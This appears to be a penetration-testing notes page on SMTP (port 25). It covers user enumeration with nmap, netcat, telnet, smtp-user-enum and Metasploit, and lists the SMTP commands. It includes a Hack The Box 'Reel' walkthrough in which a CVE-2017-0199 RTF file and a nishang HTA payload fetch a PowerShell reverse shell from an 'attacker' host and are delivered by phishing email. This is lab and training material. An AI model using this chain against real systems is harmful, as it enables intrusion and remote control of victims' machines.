# 25 (SMTP)

## Enumeration

### Checks

* [ ] Check for user enumeration
* [ ] Check version for exploits

### Scripts

#### nmap

```bash
nmap -p25 --script smtp-commands <IP>
nmap --script smtp-enum-users <IP>
nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 <IP>
```

### Manual

```bash
nc -nvv <IP> 25
VRFY root
```

```bash
telnet <IP> 25
HELO anydomain.com
MAIL FROM: BruceWayne@WayneCorp.com  # Select email address to send from
250 OK
RCPT TO: <nico@megabank.com>  # Specify email address to send to
250 OK  # Verifies the user exists
RCPT TO: <unknown@megabank.com>
550 Unknown User  # Verifies user does not exist
RCPT TO: <random@random.com>
250 OK  # Cannot actually verify as its a different domain

```

Look into sending a malicious document to have the recipient of the email open it and hopefully gain a reverse shell or have the malicious code executed.

#### Example

CVE-2017-0199 RTF file exploit using the Reel machine on Hack The Box.

<pre class="language-bash"><code class="lang-bash"># Generate malicious RTF file
python cve-2017-0199_toolkit.py -M gen -w test.rtf -u http://attacker/test.hta -t RTF -x 0
<strong># Generate malicous HTA file using examples from Out-HTA.ps1
</strong><strong>cd /opt/nishang/Client
</strong><strong>pwsh  # Start up PowerShell on Kali
</strong><strong>.\Out-HTA.ps1
</strong><strong>Out-HTA -PayloadURL http://attacker/test.ps1  # Create new ps1 script file
</strong><strong>
</strong><strong>mv winDef_webInstall.hta /path/to/www
</strong><strong>cp ../CVE-2017-0199/test.rtf /peth/to/www
</strong><strong>cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1
</strong><strong>mv /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 test.ps1  # Move Invoke-PowerShellTcp -Reverse to the bottom of the script
</strong><strong>python3 -m http.server 80
</strong><strong>nc -lvnp 9001
</strong><strong>
</strong><strong>sendemail -f test@megabank.com -t nico@megabank.com -u RTF -m "Please conver this" -a test.rtf -s 10.10.10.77
</strong><strong># Wait for reverse shell
</strong></code></pre>

### Commands

```bash
HELO - 
EHLO - Extended SMTP.
STARTTLS - SMTP communicted over unencrypted protocol. By starting TLS-session we encrypt the traffic.
RCPT - Address of the recipient.
DATA - Starts the transfer of the message contents.
RSET - Used to abort the current email transaction.
MAIL - Specifies the email address of the sender.
QUIT - Closes the connection.
HELP - Asks for the help screen.
AUTH - Used to authenticate the client to the server.
VRFY - Asks the server to verify is the email user's mailbox exists.
```

### **smtp-user-enum**

```bash
smtp-user-enum -M VRFY -U /root/sectools/SecLists/Usernames/Names/names.txt -t <IP>
```

```bash
Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... /root/sectools/SecLists/Usernames/Names/names.txt
Target count ............. 1
Username count ........... 8607
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Sun Jun 19 11:04:59 2016 #########
192.168.1.103: Bin exists
192.168.1.103: Irc exists
192.168.1.103: Mail exists
192.168.1.103: Man exists
192.168.1.103: Sys exists
######## Scan completed at Sun Jun 19 11:06:51 2016 #########
5 results.

8607 queries in 112 seconds (76.8 queries / sec)
```

### Metasploit

```bash
msf > use auxiliary/scanner/smtp/smtp_enum 
msf auxiliary(smtp_enum) > show options

Module options (auxiliary/scanner/smtp/smtp_enum):

   Name       Current Setting                                                Required  Description
   ----       ---------------                                                --------  -----------
   RHOSTS                                                                    yes       The target address range or CIDR identifier
   RPORT      25                                                             yes       The target port
   THREADS    1                                                              yes       The number of concurrent threads
   UNIXONLY   true                                                           yes       Skip Microsoft bannered servers when testing unix users
   USER_FILE  /usr/share/metasploit-framework/data/wordlists/unix_users.txt  yes       The file that contains a list of probable users accounts.
```
